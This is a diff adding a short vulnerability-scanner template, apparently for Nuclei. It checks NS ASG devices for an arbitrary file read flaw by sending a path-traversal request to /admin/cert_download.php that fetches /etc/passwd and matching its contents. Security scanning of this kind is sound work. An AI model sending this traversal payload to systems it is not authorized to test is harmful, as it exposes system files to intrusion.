@@ -1,0 +1,19 @@
+id: nsasg-arbitrary-file-read
+info:
+  author: pikpikcu
+  name: NS ASG Arbitrary File Read
+  reference: https://zhuanlan.zhihu.com/p/368054963
+  severity: high
+  tags: nsasg,lfi
+requests:
+- matchers:
+  - regex:
+    - 'root:.*:0:0:'
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd'
